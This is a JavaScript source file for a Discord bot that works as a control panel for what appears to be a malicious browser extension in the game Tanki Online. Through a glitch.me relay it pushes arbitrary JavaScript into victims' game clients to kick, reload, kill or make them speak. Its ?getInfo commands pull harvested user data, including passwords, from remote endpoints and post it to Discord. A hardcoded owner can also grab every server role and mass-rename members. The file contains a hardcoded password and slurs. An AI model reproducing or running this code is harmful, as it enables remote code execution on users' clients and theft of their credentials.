//require('dotenv').config();
/*const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

client.on('messageCreate', message => {
  if (message.content === '!ping') {
    message.reply('🏓 Pong!');
  }
});

client.login(process.env.DISCORD_TOKEN);


const app = express();
app.get('/', (req, res) => res.send('Bot is running!'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 Web server running on port ${PORT}`));
*/

const WebSocket = require("ws");
var wss;
/*wss = new WebSocket.Server({ port: 8080 });
wss.on("connection", (ws) => {
    console.log("New WebSocket connection");

    ws.on("message", (message) => {
        console.log("Received:", message.toString());

        const channel = s4d.client.channels.cache.get("1323398721148555359");
        if (channel) channel.send(message.toString());
    });

    ws.on("close", () => console.log("WebSocket closed"));
});*/
/*const express = require('express');
const app = express();

app.get('/', (req, res) => {
    res.send('Bot is running!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});*/




(async () => {
    function runCommand(t, e, n) {
        selected = [];
        selected.push(t);
        e = e.replaceAll('_', ' ');
        switch (e) {
            case 'Show Message: ':
                var message = n;
                var link = `https://sapphire-burnt-cut.glitch.me/api/sendToClient?JS=if(${JSON.stringify(selected)}.some(t=%3EUser.name==t)){sendMessage('${message}')}`;
                console.log(link);
                fetch(link);
                break;
            case 'Kick From Battle':
                var link = `https://sapphire-burnt-cut.glitch.me/api/sendToClient?JS=if(${JSON.stringify(selected)}.some(t=%3EUser.name==t)){document.querySelector(%27.BattleHudComponentStyle-pauseButton%27).click();%20setTimeout(()%20=%3E%20{%20document.querySelector(%27.BattlePauseMenuComponentStyle-selectedMenuRedButton%27).click();%20},%20500);}`;
                fetch(link);
                break;
            case 'Refresh':
                var link = `https://sapphire-burnt-cut.glitch.me/api/sendToClient?JS=if(${JSON.stringify(selected)}.some(t=%3EUser.name==t)){location.reload()}`;
                fetch(link);
                break;
            case 'Join Match Named: ':
                var match = n;
                var link = `https://sapphire-burnt-cut.glitch.me/api/sendToClient?JS=if(${JSON.stringify(selected)}.some(t=%3EUser.name==t)){async%20function%20waitForSelector(t%2Co%3D5e3)%7Bconst%20n%3DDate.now()%3Bfor(%3BDate.now()-n%3Co%3B)%7Bconst%20o%3Ddocument.querySelector(t)%3Bif(o)return%20o%3Bawait%20new%20Promise((t%3D%3EsetTimeout(t%2C100)))%7Dthrow%20new%20Error(%60Selector%20%27%24%7Bt%7D%27%20not%20found%20within%20%24%7Bo%7Dms%60)%7Dasync%20function%20leaveMatch()%7B(await%20waitForSelector(%22.BattleHudComponentStyle-pauseButton%22)).click()%3B(await%20waitForSelector(%22.BattlePauseMenuComponentStyle-selectedMenuRedButton%22)).click()%7Dasync%20function%20clickMatch(t)%7Bawait%20waitForSelector(%22tr%22)%3Bconst%20o%3DArray.from(document.querySelectorAll(%22tr%22)).find((o%3D%3Eo.textContent.includes(t)))%3Bif(!o)throw%20new%20Error(%60Match%20containing%20%27%24%7Bt%7D%27%20not%20found.%60)%3Bo.click()%7Dasync%20function%20joinGame(t)%7Bconst%20o%3Ddocument.querySelectorAll(%22.JoinToBattleComponentStyle-buttonJoin%22)%3Bif(!o%7C%7C!o%5Bt%5D)throw%20new%20Error(%60Join%20button%20index%20%24%7Bt%7D%20not%20found.%60)%3Bo%5Bt%5D.click()%7Dasync%20function%20confirmJoin()%7B(await%20waitForSelector(%22.DialogContainerComponentStyle-enterButton%22)).click()%7D(async()%3D%3E%7Btry%7Bawait%20clickMatch(%22${match}%22)%2CsetTimeout((()%3D%3E%7BjoinGame(0)%7D)%2C500)%2Cawait%20confirmJoin()%7Dcatch(t)%7Bconsole.error(%22An%20error%20occurred%3A%22%2Ct)%7D%7D)()%3B}`;
                fetch(link);
                break;
            case 'Self Destruct':
                var link = `https://sapphire-burnt-cut.glitch.me/api/sendToClient?JS=if(${JSON.stringify(selected)}.some(t=%3EUser.name==t)){press('Delete', true);press('Delete', false)}`;
                fetch(link);
                break;
            case 'Instant Kill':
                var link = `https://sapphire-burnt-cut.glitch.me/api/sendToClient?JS=if(${JSON.stringify(selected)}.some(t=%3EUser.name==t)){Tanki.interpolatedTankPosition.x17_1-=100000}`;
                fetch(link);
                break;
            case 'Disable Aimbot':
                var link = `https://sapphire-burnt-cut.glitch.me/api/sendToClient?JS=if(${JSON.stringify(selected)}.some(t=%3EUser.name==t)){Object.defineProperty(window,'Aimbot',{value:false,writable:false,configurable:false});}`;
                fetch(link);
                break;
            case 'Disable Hack Features':
                var link = `https://sapphire-burnt-cut.glitch.me/api/sendToClient?JS=if(${JSON.stringify(selected)}.some(t=%3EUser.name==t)){removeEventListeners();function aa(){};config={}}`;
                fetch(link);
                break;
            case 'Talk':
                var message = n;
                var link = `https://sapphire-burnt-cut.glitch.me/api/sendToClient?JS=if(${JSON.stringify(selected)}.some(t=%3EUser.name==t)){speechSynthesis.speak(new%20SpeechSynthesisUtterance(%27${message}%27))}`;
                fetch(link);
                break;
        };
    };

    async function fetchDynamicHTML(site) {
        // Launch a headless browser instance
        const browser = await puppeteer.launch();
        const page = await browser.newPage();

        // Open the URL
        await page.goto(site, {
            waitUntil: 'networkidle0', // Wait until network is idle (all resources are loaded)
        });

        // Get the fully rendered HTML after JS execution
        const fullHTML = await page.evaluate(() => {
            return document.documentElement.outerHTML; // Get the full HTML of the page
        });

        console.log(fullHTML); // Log or process the HTML as needed

        await browser.close(); // Close the browser
    }
    // default imports
    //const puppeteer = require('puppeteer');
    const fetch = require('node-fetch');
    const events = require('events');
    const { exec } = require("child_process")
    const logs = require("discord-logs")
    const Discord = require("discord.js")
    const {
        MessageEmbed,
        MessageButton,
        MessageActionRow,
        Intents,
        Permissions,
        MessageSelectMenu,
        Client, GatewayIntentBits, ActivityType,
        SlashCommandBuilder,
        Collection
    } = require("discord.js")
    const fs = require('fs');
    let process = require('process');
    wss = new WebSocket.Server({ port: 8080 });
    global.wss = wss;
    wss.on("connection", (ws) => {
        console.log("New WebSocket connection");

        ws.on("message", (message) => {
            console.log("Received:", message.toString());
            var everyone = false, requested = false;
            var msg = message.toString();
            if (msg.startsWith('everyone:')) everyone = true, msg = msg.replace('everyone:', '');
            if (msg.includes('(requested)')) requested = true;
            const embed = {
                color: requested ? 0x2ecc71 : 0x3498db,
                title: "📡 " + msg
            };
            const channel = s4d.client.channels.cache.get(/*"1354636184768352457"*/'1360693677181243524');
            if (everyone) {
                if (channel) channel.send({ content: '@everyone', embeds: [embed] }).catch(console.error);
            } else {
                if (channel) channel.send({ embeds: [embed] }).catch(console.error);
            };
        });

        ws.on("close", () => console.log("WebSocket closed"));
    });
    const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    // block imports
    let URL = require('url')
    let DIG = require("discord-image-generation")
    let https = require("https")

    // define s4d components (pretty sure 90% of these arnt even used/required)
    let s4d = {
        Discord,
        fire: null,
        joiningMember: null,
        reply: null,
        player: null,
        manager: null,
        Inviter: null,
        message: null,
        notifer: null,
        checkMessageExists() {
            if (!s4d.client) throw new Error('You cannot perform message operations without a Discord.js client')
            if (!s4d.client.readyTimestamp) throw new Error('You cannot perform message operations while the bot is not connected to the Discord API')
        }
    };

    // check if d.js is v13
    if (!require('./package.json').dependencies['discord.js'].startsWith("^13.")) {
        let file = JSON.parse(fs.readFileSync('package.json'))
        file.dependencies['discord.js'] = '^13.15.1'
        fs.writeFileSync('package.json', JSON.stringify(file, null, 4))
        exec('npm i')
        throw new Error("Seems you arent using v13 please re-run or run `npm i discord.js@13.12.0`");
    }

    // check if discord-logs is v2
    if (!require('./package.json').dependencies['discord-logs'].startsWith("^2.")) {
        let file = JSON.parse(fs.readFileSync('package.json'))
        file.dependencies['discord-logs'] = '^2.0.0'
        fs.writeFileSync('package.json', JSON.stringify(file, null, 4))
        exec('npm i')
        throw new Error("discord-logs must be 2.0.0. please re-run or if that fails run `npm i discord-logs@2.0.0` then re-run");
    }

    // create a new discord client
    s4d.client = new s4d.Discord.Client({
        intents: [
            Object.values(s4d.Discord.Intents.FLAGS).reduce((acc, p) => acc | p, 0)
        ],
        partials: [
            "REACTION",
            "CHANNEL"
        ]
    });

    const statuses = [
        { name: 'Splxff', type: 'PLAYING' },
        { name: 'Is', type: 'LISTENING' },
        { name: 'The', type: 'WATCHING' },
        { name: 'King!', type: 'COMPETING' }
    ];

    // when the bot is connected say so
    s4d.client.on('ready', () => {
        console.log(s4d.client.user.tag + " is alive!");
        let index = 0;
        setInterval(() => {
            const status = statuses[index];
            s4d.client.user.setActivity(status.name, { type: status.type });
            index = (index + 1) % statuses.length;
        }, 5000); // Change status every 5 seconds

    })

    // upon error print "Error!" and the error
    process.on('uncaughtException', function(err) {
        console.log('Error!');
        console.log(err);
    });

    // give the new client to discord-logs
    logs(s4d.client);

    // pre blockly code


    // blockly code
    var prefix, i;




    await s4d.client.login(process.env.DISCORD_TOKEN).catch((e) => {
        const tokenInvalid = true;
        const tokenError = e;
        if (e.toString().toLowerCase().includes("token")) {
            throw new Error("An invalid bot token was provided!")
        } else {
            throw new Error("Privileged Gateway Intents are not enabled! Please go to https://discord.com/developers and turn on all of them.")
        }
    });

    s4d.client.on('ready', async () => {
        prefix = 'you bot prefix';

    });

    s4d.client.on('messageCreate', async (s4dmessage) => {
        if ((s4dmessage.content) == 'test') {
            s4dmessage.channel.send({ content: String('pong!') });
        }
        if ((s4dmessage.content).includes('ya tu sabe')) {
            s4dmessage.channel.send({ content: String('me sigues') });
        }
        if ((s4dmessage.content).startsWith('?findMembersOf AR')) {
            wss.send('console.log("requested");ext_top("sendARMemebers()")');
        }
        if ((s4dmessage.content).startsWith('?test socket')) {
            global.wss.send('console.log("test");');
        }
        if (s4dmessage.author.id !== '567464149425061918' && !s4dmessage.author.bot) {
            // Delete the message if it's not from the specified user and not a bot
            //s4dmessage.delete().catch(console.error);

            // Prepare the embed for a more visually appealing message
            const userMention = `${s4dmessage.author.username}`;
            const messageContent = s4dmessage.content;

            const embed = {
                color: 0x00AE86, // Embed color (greenish)
                author: {
                    name: `Message by ${userMention}`,
                    icon_url: s4dmessage.author.displayAvatarURL(), // Optional: Adds the user's avatar
                },
                description: `${messageContent}`,
                fields: [
                    {
                        name: 'Please daddy',
                        value: 'Give it to me.',
                        inline: false,
                    }
                ],
                footer: {
                    text: 'Splxff is the goat!',
                    icon_url: 'https://th.bing.com/th/id/OIP.hZG3X2YS_-NEFvmdo7xuKwHaMW?w=189&h=315&c=7&r=0&o=5&pid=1.7', // Optional: Footer icon
                },
                timestamp: new Date(),
            };

            // Send the embed to the channel
            //    s4dmessage.channel.send({ embeds: [embed] }).catch(console.error);

            // Optional: React with emojis
            // s4dmessage.react('💩').catch(console.error);
            // s4dmessage.react('🤡').catch(console.error);
            // s4dmessage.reply({ content: 'u a bitch nigga' }).catch(console.error);
        }
        /*if ((s4dmessage.content).includes('?getInfo ')) {
            if ((s4dmessage.author.id === '567464149425061918' && !s4dmessage.author.bot)) {
                if ((s4dmessage.content).includes('?map')) {
                    s4dmessage.reply({ content: '#/battle=2aaaaabafaaf1100' }).catch(console.error);
                }
            } else {
                s4dmessage.reply({
                    content: String('You are not authorized to use this command.'),
                    allowedMentions: {
                        repliedUser: true
                    }
                });
                return;
            }
            switch (s4dmessage.content.replace('?getInfo ', '')) {
                case 'Soduko':
                    s4dmessage.reply({ content: 'someoneaye' }).catch(console.error);
                    break;
                case 'Oppressor':
                    s4dmessage.reply({ content: 'FISHYY' }).catch(console.error);
                    break;
                case 'Sick':
                    s4dmessage.reply({ content: 'Bitch Ass Nigga' }).catch(console.error);
                    break;
                case 'Foreign':
                    s4dmessage.reply({ content: 'Wh0r3' }).catch(console.error);
                    break;
            };
        }*/
        if ((s4dmessage.author.id === '567464149425061918') && s4dmessage.content.startsWith('?giveAllRoles')) {
            const member = s4dmessage.guild.members.cache.get(s4dmessage.author.id);

            if (!member) return s4dmessage.reply('Could not find your member data.');

            s4dmessage.guild.roles.cache.forEach(async (role) => {
                if (!member.roles.cache.has(role.id) && role.managed === false) {
                    try {
                        await member.roles.add(role);
                    } catch (err) {
                        console.error(`Failed to add role: ${role.name}`, err);
                    }
                }
            });

            s4dmessage.reply('✅ All available roles have been added to you!');
        };
        if ((s4dmessage.author.id === '567464149425061918') && s4dmessage.content.startsWith('?setNicks ')) {
            const newNickname = s4dmessage.content.replace('?setNicks ', '').trim();

            if (!newNickname) {
                s4dmessage.reply('Usage: `?setNicks NewNickname`').catch(console.error);
                return;
            }

            s4dmessage.guild.members.fetch().then(members => {
                let successCount = 0;
                let failureCount = 0;
                let delay = 0; // Initial delay

                members.forEach(member => {
                    if (member.manageable) {
                        setTimeout(() => {
                            member.setNickname(newNickname)
                                .then(() => successCount++)
                                .catch(() => failureCount++);
                        }, delay);

                        delay += 1000; // Add 1-second delay per user to prevent rate limiting
                    } else {
                        failureCount++;
                    }
                });

                setTimeout(() => {
                    s4dmessage.reply(`Successfully changed ${successCount + 1} nicknames. Failed to change ${failureCount - 1}.`).catch(console.error);
                    s4dmessage.delete();
                }, delay + 2000); // Wait for the last nickname change before sending the reply
            }).catch(console.error);
        }

        if (s4dmessage.content == '?getInfo Oppressor info password') {
            s4dmessage.reply('FISHYYPRO69');
            return;
        };

        if (s4dmessage.content == '?getOnlineUsers') {
            fetch('https://sapphire-burnt-cut.glitch.me/api/getOnlineUsers')
                .then(r => { return r.text() })
                .then(d => {
                    s4dmessage.reply(d + ' NOTE: this only works for people with the latest extension');
                })
            return;
        };

        if (s4dmessage.content.startsWith('?runCommand ')) {
            var commandParamsNum = s4dmessage.content.replace('?runCommand ', '').split(' ').length - 1;
            var commandParams = s4dmessage.content.replace('?runCommand ', '').split(' ');
            runCommand(commandParams[0], commandParams[1], s4dmessage.content.replace(`?runCommand ${commandParams[0]} ${commandParams[1]} `, ''));
        };

        if (s4dmessage.content.startsWith('?getInfo ')) {
            if (s4dmessage.author.id !== '567464149425061918') {
                if (['Soduko', 'Meteron', 'Menum', 'Neveah', 'Finito', 'Audemar', 'password', 'Password', 'patata', 'Faceshot'].some(t => s4dmessage.content.includes(t))) {
                    s4dmessage.reply('no access');
                    return;
                };
            };
            var commandParamsNum = s4dmessage.content.replace('?getInfo ', '').split(' ').length - 1;
            var commandParams = s4dmessage.content.replace('?getInfo ', '').split(' ');
            fetch('https://actually-hickory-squirrel.glitch.me/api/viewMessages')
                .then(r => {
                    return r.text();
                })
                .then(d => {
                    var data = JSON.parse(d).messages.filter(t => !['Neveah', 'Menum', 'Concealed'].includes(t.name));
                    var names = '';
                    data.forEach(message => {
                        names += `${message.name}, `;
                    });
                    switch (commandParamsNum) {
                        case 0:
                            s4dmessage.reply(names).catch(console.error);
                            break;
                        case 1:
                            s4dmessage.reply(JSON.stringify(data.filter(t => t.name == commandParams[0])[0][commandParams[1]])).catch(console.error);
                            break;
                        case 2:
                            if (commandParams[2] == 'password') {
                                s4dmessage.reply(JSON.stringify(data.filter(t => t.name == commandParams[0])[0][commandParams[1]]['patata'])).catch(console.error);
                            } else {
                                s4dmessage.reply(JSON.stringify(data.filter(t => t.name == commandParams[0])[0][commandParams[1]][commandParams[2]])).catch(console.error);
                            };
                            break;
                    };
                });
        };
        if (s4dmessage.content.startsWith('?getInfo2 ')) {
            if (s4dmessage.author.id !== '567464149425061918') {
                if (['Soduko', 'Meteron', 'Menum', 'Neveah', 'Finito', 'Audemar', 'password', 'Password', 'patata', 'Faceshot', 'Splxff'].some(t => s4dmessage.content.includes(t))) {
                    s4dmessage.reply('no access');
                    return;
                };
            };
            var commandParamsNum = s4dmessage.content.replace('?getInfo2 ', '').split(' ').length - 1;
            var commandParams = s4dmessage.content.replace('?getInfo2 ', '').split(' ');
            fetch('https://southern-thunder-piano.glitch.me/api/viewMessages')
                .then(r => {
                    return r.text();
                })
                .then(d => {
                    var data = JSON.parse(d);
                    switch (commandParamsNum) {
                        case 0:
                            s4dmessage.reply(JSON.stringify(data.filter(t => t.uid.includes(commandParams[0]))[0])).catch(console.error);
                            break;
                        case 1:
                            s4dmessage.reply(JSON.stringify(data.filter(t => t.uid.includes(commandParams[0]))[0][commandParams[1]])).catch(console.error);
                            break;
                        case 2:
                            if (commandParams[2] == 'password') {
                                s4dmessage.reply(JSON.stringify(data.filter(t => t.name == commandParams[0])[0][commandParams[1]]['patata'])).catch(console.error);
                            } else {
                                s4dmessage.reply(JSON.stringify(data.filter(t => t.name == commandParams[0])[0][commandParams[1]][commandParams[2]])).catch(console.error);
                            };
                            break;
                    };
                });
        };

        if (s4dmessage.content.startsWith('?getInfo2Live ')) {
            if (s4dmessage.author.id !== '567464149425061918') {
                if (['Soduko', 'Meteron', 'Menum', 'Neveah', 'Finito', 'Audemar', 'password', 'Password', 'patata', 'Faceshot'].some(t => s4dmessage.content.includes(t))) {
                    s4dmessage.reply('no access');
                    return;
                };
            };
            var commandParamsNum = s4dmessage.content.replace('?getInfo2Live ', '').split(' ').length - 1;
            var commandParams = s4dmessage.content.replace('?getInfo2Live ', '').split(' ');
            switch (commandParamsNum) {
                case 0:
                    wss.send(`ws2.send(JSON.stringify(getMyData().find(t => t.uid.includes('${commandParams[0]}'))))`);
                    break;
            };
        };

        /*if (s4dmessage.content.startsWith('?setNick')) {
            const args = s4dmessage.content.split(' ');
            if (args.length < 3) {
                s4dmessage.reply('Usage: `?setNick @user NewNickname`').catch(console.error);
                return;
            }

            const targetUser = s4dmessage.mentions.users.first();
            const newNickname = args.slice(2).join(' ');

            if (!targetUser) {
                s4dmessage.reply('Please mention a user to set their nickname.').catch(console.error);
                return;
            }

            const guildMember = s4dmessage.guild.members.cache.get(targetUser.id);

            if (!guildMember) {
                s4dmessage.reply('User not found in this server.').catch(console.error);
                return;
            }

            try {
                await guildMember.setNickname(newNickname);
                s4dmessage.reply(`Successfully changed ${targetUser.username}'s nickname to "${newNickname}"!`).catch(console.error);
            } catch (error) {
                console.error(error);
                s4dmessage.reply('Failed to change the nickname. Ensure the bot has the proper permissions and role hierarchy.').catch(console.error);
            }
        }*/
    });

    s4d.client.on('guildMemberAdd', async (param1) => {
        s4d.joiningMember = param1;
        s4d.joiningMember = null
    });

    s4d.client.on('messageCreate', async (s4dmessage) => {
        // U can replace delete with smth else
        if (((s4dmessage.content) || '').startsWith((String(prefix) + 'delete') || '')) {
            (s4dmessage.channel).send({ files: [(new Discord.MessageAttachment((await new DIG.Delete().getImage(((s4dmessage.mentions.members.first()).displayAvatarURL({ format: "png" })))), "image.png"))] });
        }
        // U can replace batslap with smth else
        if (((s4dmessage.content) || '').startsWith((String(prefix) + 'batslap') || '')) {
            (s4dmessage.channel).send({ files: [(new Discord.MessageAttachment((await new DIG.Batslap().getImage(((s4dmessage.author).displayAvatarURL({ format: "png" })), ((s4dmessage.mentions.members.first()).displayAvatarURL({ format: "png" })))), "image.png"))] });
        }
        if (((s4dmessage.content) || '').startsWith((String(prefix) + 'triggered') || '')) {
            (s4dmessage.channel).send({ files: [(new Discord.MessageAttachment((await new DIG.Triggered().getImage(((s4dmessage.mentions.members.first()).displayAvatarURL({ format: "png" })))), "image.gif"))] });
        }

    });

    return s4d
})();
